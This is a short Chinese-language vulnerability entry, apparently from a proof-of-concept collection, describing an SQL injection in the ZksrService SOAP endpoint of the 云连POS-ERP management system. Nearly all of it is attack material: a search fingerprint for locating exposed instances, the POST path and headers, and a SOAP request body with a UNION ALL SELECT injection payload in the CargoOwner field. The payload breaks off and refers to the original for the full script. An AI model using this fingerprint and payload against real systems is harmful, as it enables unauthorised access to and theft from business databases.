# 云连POS-ERP管理系统ZksrService存在SQL注入漏洞

- **系统**：云连POS-ERP管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="Powered By chaosZ"`
- **请求**：`POST /services/ZksrService HTTP/1.1`
- **关键头**：`SOAPAction: ""`　`Content-Type: text/xml; charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.service.chaosZ.com">
<soapenv:Header/>
<soapenv:Body>
<web:getItemInfo soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<data xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">{"CargoOwner":"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(120)+CHAR(113)+CHAR(72)+CHAR(107)+CHAR(78)+CHAR(109)+CHAR(100)+…（脚本共 1061 字，完整版见原文）
```
- **预期**：200　|　—